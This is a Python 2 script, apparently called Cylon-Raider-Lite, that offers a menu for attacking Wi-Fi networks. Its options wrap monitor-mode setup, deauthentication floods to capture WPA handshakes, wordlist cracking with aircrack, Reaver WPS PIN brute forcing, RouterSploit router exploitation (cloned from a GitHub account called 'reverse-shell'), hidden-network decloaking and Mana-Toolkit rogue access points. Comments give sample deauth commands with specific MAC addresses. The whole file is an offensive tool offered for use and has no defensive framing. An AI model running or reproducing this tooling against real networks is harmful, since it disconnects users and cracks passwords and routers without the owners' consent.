#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
# #from termcolor import colored
import sys
# sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen


# variable = __import__('module').class.variable

# os.system('cat /root/Cylon-Raider-Lite/cylonraider_banner.txt')
# os.system('cat /root/Cylon-Raider-Lite/banner_CrackHead.txt')
def airmon(): #No need for classes here, just one variable
    # capture_Interface = str(raw_input("Enter the wireless INTERFACE that you want to capture with: "))
    capture_Interface = 'wlan1'
    cmd_String = "airmon-ng start wlan1"
    print cmd_String
    os.system(cmd_String)
    #sample Join syntax (joins on the LEFT)
    # print ()"\n\t".join(capture_Interface))
    mon_String = "mon"
    airodump_String = capture_Interface + mon_String
    print 'Your airodump interface is... wlan1mon'
    print "Remember this string for the next step, AIRODUMP"
    main()
    return capture_Interface



def airodump():

    # os.system('cat /root/Cylon-Raider-Lite/banner_airodump.txt')
    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. INFORMATION GATHERING, start Airodump to look for a good target to attack',
        '#2. TARGETED CAPTURE, change Airodump-ng parameters to capture packets of a targeted router'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "1":
        os.system('clear')
        # os.system("gnome-terminal -e 'bash -c \"python /root/Cylon-Raider-Lite/CrackHead_Recon.py; exec bash\"'")
        os.system("python /root/Cylon-Raider-Lite/CrackHead_Recon.py")
        airodump()
    elif opt_Choice == "0":
        os.system('clear')
        main()
    elif opt_Choice == "2":
        os.system('clear')
        # os.system("gnome-terminal -e 'bash -c \"python /root/Cylon-Raider-Lite/CrackHead_Targeted.py; exec bash\"'")
        os.system("python /root/Cylon-Raider-Lite/CrackHead_Targeted.py")
        airodump()
        return
    else:
        print 'You have entered a invalid option'
        airodump()
    return


def aireplay():
    # os.system("gnome-terminal -e 'bash -c \"python /root/Cylon-Raider-Lite/CrackHead_Replay.py; exec bash\"'")
    os.system("python /root/Cylon-Raider-Lite/CrackHead_Replay.py")
    main()
    return

def aircrack():
    # os.system("gnome-terminal -e 'bash -c \"python /root/Cylon-Raider-Lite/CrackHead_Aircrack.py; exec bash\"'")
    os.system("python /root/Cylon-Raider-Lite/CrackHead_Aircrack.py")
    main()
    return

def REAVER():
    # os.system("gnome-terminal -e 'bash -c \"python /root/Cylon-Raider-Lite/Heavy-Raider/HeavyRaider.py; exec bash\"'")
    os.system("python /root/Cylon-Raider-Lite/Heavy-Raider/HeavyRaider.py")
    main()
    return

def RouterSploit():
    opt_List = [
        '\n\t#0. Return to Main Menu',
        'INSTALL. Install the RouterSploit Framework',
        '#1. Run the RouterSploit Framework'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION, or type INSTALL in all caps to install RouterSploit: "))

    if opt_Choice == "1":
        os.system('clear')
        # os.system("gnome-terminal -e 'bash -c \"python /root/Cylon-Raider-Lite/routersploit/rsf.py; exec bash\"'")
        os.system("python /root/Cylon-Raider-Lite/routersploit/rsf.py")
        os.system("")
        main()
    elif opt_Choice == "INSTALL":
        os.system('clear')
        print 'Git Cloning RouterSploit into your Cylon-Raider Installation'
        os.system('cd /root/Cylon-Raider')
        os.system('git clone https://github.com/reverse-shell/routersploit.git')
        print 'Routersploit install complete'
        main()
    return

def Decloaker():
    # os.system("gnome-terminal -e 'bash -c \"python /root/Cylon-Raider-Lite/sniffHidden.py; exec bash\"'")
    os.system("python /root/Cylon-Raider-Lite/sniffHidden.py")
    main()
    return

def injection_test():
    # syntax
    # # aireplay-ng -9 -a C6:9f:db:8f:e6:15 wlan0mon --ignore-negative-one

    # test_target = str(raw_input("Enter the MAC address of your target or '-i wlan0' to test against your own internal wireless card: "))
    os.system('airmon-ng start wlan1')
    cmd_String = "aireplay-ng -9 wlan1mon --ignore-negative-one"
    print cmd_String
    os.system(cmd_String)
    main()
    return

def client_mac_targeting():
# syntax
# aireplay-ng --deauth 1000 -c 9C:d2:1e:61:8b:a1 -a 80:2a:a8:1b:e9:29 --ignore-negative-one wlan1mon

    # os.system("gnome-terminal -e 'bash -c \"python /root/Cylon-Raider-Lite/Client_Mac_Targeting.py; exec bash\"'")
    os.system("python /root/Cylon-Raider-Lite/Client_Mac_Targeting.py")
    main()
    return

def mana_toolkit():
    os.system("python /root/Cylon-Raider-Lite/OutOfMana.py")
    main()

def replay_attack():
    os.system('python /root/Cylon-Raider-Lite/Raider_Targeted.py')
    main()
def main():
    opt_List = [
        '\n\t#1. AIRMON, start up the capture interface',
        '#2. INFORMATION GATHERING, begin scanning local access points in range and/or capture packets',
        '#3. TARGETED GATHERING + REPLAY ATTACK (w/ Client-Targeting Option), send deauthorization packets to disconnect target clients and capture the 4-way handshake',
        '#4. AIRCRACK, attempt to crack the 4-way handshake with a wordlist (dictionary attack)',
        '#5. HEAVY-RAIDER, run Reaver, the WPS Protection PIN brute forcer',
        '#6. RSF, run Router-Sploit, for exploitation stages of Wi-Fi Hacking',
        '#7. HIDDEN NETWORK DECLOAKER, adapted from Violent Python by TJ OConnor',
        '#8. ARP Injection Test, See if your external wireless card could inject packets',
        '#9. MANA-TOOLKIT, run Mana-Toolkit'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "1":
        os.system('clear')
        airmon()
    elif opt_Choice == "2":
        os.system('clear')
        os.system("python /root/Cylon-Raider-Lite/CrackHead_Recon.py")
    elif opt_Choice == "3":
        os.system('clear')
        replay_attack()
    elif opt_Choice == "4":
        os.system('clear')
        aircrack()
    elif opt_Choice == "5":
        os.system('clear')
        REAVER()
    elif opt_Choice == "6":
        os.system('clear')
        RouterSploit()
    elif opt_Choice == "7":
        os.system('clear')
        Decloaker()
    elif opt_Choice == "8":
        os.system('clear')
        injection_test()
    elif opt_Choice == "9":
        os.system('clear')
        mana_toolkit()
    else:
        print 'You have entered a invalid option'
        main()
    return
main()
